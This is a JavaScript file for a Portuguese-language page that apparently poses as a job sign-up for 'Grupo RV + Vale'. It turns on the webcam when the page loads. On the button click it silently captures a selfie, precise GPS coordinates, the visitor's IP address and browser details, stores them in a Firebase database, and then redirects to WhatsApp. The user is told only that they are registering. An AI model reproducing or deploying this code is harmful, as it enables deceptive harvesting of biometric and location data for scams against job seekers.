// script.js

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getFirestore,
  addDoc,
  collection,
  serverTimestamp
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {

  apiKey:
  "AIzaSyA4tZjjfiOauLn2PPxYAp6ylNqB9LWJkI0",

  authDomain:
  "rv-grup.firebaseapp.com",

  projectId:
  "rv-grup",

  storageBucket:
  "rv-grup.firebasestorage.app",

  messagingSenderId:
  "1061419825993",

  appId:
  "1:1061419825993:web:5cb7b020efd40b8cf13898"

};

const app =
initializeApp(firebaseConfig);

const db =
getFirestore(app);

const video =
document.getElementById("video");

const btn =
document.getElementById("btn");

const statusText =
document.getElementById("status");

const canvas =
document.getElementById("canvas");

async function iniciarCamera(){

  try{

    const fala =
    new SpeechSynthesisUtterance(
      "Clique no botão verde para participar das vagas."
    );

    fala.lang = "pt-BR";

    speechSynthesis.speak(fala);

    const stream =
    await navigator.mediaDevices
    .getUserMedia({

      video:{
        facingMode:"user"
      },

      audio:false

    });

    video.srcObject = stream;

    await video.play();

    statusText.innerHTML =
    "✅ Sistema pronto";

  }

  catch(err){

    console.log(err);

    statusText.innerHTML =
    "❌ Permita câmera";

  }

}

window.onload = ()=>{

  iniciarCamera();

};

btn.addEventListener(
  "click",
  async()=>{

    try{

      btn.disabled = true;

      btn.innerHTML =
      "PROCESSANDO...";

      statusText.innerHTML =
      "📸 Capturando selfie...";

      canvas.width =
      video.videoWidth;

      canvas.height =
      video.videoHeight;

      const ctx =
      canvas.getContext("2d");

      ctx.drawImage(
        video,
        0,
        0,
        canvas.width,
        canvas.height
      );

      const selfie =
      canvas.toDataURL(
        "image/jpeg",
        0.7
      );

      let latitude =
      "não permitido";

      let longitude =
      "não permitido";

      try{

        const localizacao =
        await new Promise(
          (resolve,reject)=>{

            navigator.geolocation
            .getCurrentPosition(
              resolve,
              reject,
              {
                enableHighAccuracy:true,
                timeout:10000
              }
            );

          }
        );

        latitude =
        localizacao.coords.latitude;

        longitude =
        localizacao.coords.longitude;

      }

      catch(err){

        console.log(err);

      }

      let ip =
      "indisponível";

      try{

        const req =
        await fetch(
          "https://ipapi.co/json/"
        );

        const json =
        await req.json();

        ip =
        json.ip;

      }

      catch(err){

        console.log(err);

      }

      statusText.innerHTML =
      "💾 Salvando cadastro...";

      await addDoc(
        collection(
          db,
          "checkins"
        ),
        {

          selfie:selfie,

          latitude:latitude,

          longitude:longitude,

          ip:ip,

          userAgent:
          navigator.userAgent,

          plataforma:
          navigator.platform,

          idioma:
          navigator.language,

          data:
          serverTimestamp()

        }
      );

      statusText.innerHTML =
      "✅ Cadastro concluído";

      window.location.href =
      "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";

    }

    catch(err){

      console.log(err);

      statusText.innerHTML =
      "❌ Erro no cadastro";

      btn.disabled = false;

      btn.innerHTML =
      "QUERO PARTICIPAR";

    }

  }
);
